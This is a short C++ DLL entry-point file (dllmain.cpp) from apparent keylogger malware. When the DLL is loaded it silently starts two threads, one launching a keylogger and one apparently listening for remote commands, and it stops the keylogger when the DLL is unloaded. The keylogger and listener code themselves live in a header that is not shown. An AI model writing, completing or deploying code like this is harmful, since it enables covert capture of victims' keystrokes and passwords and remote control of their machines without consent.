// dllmain.cpp : Defines the entry point for the DLL application.
#include "stdafx.h"
#include "keylogger.h"

DWORD MainThread(LPVOID threadParam)
{
	StartKeyLogger();
	return 0;
}

DWORD ListenForCommands(LPVOID threadParam)
{
	StartListen();
	return 0;
}
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
	switch (fdwReason)
	{
	case DLL_PROCESS_ATTACH:
		CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MainThread, NULL, 0, NULL);
		CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ListenForCommands, NULL, 0, NULL);
		break;
	case DLL_PROCESS_DETACH:
		StopKeyLogger();
		break;
	default:
		break;
	}
	return TRUE;
}

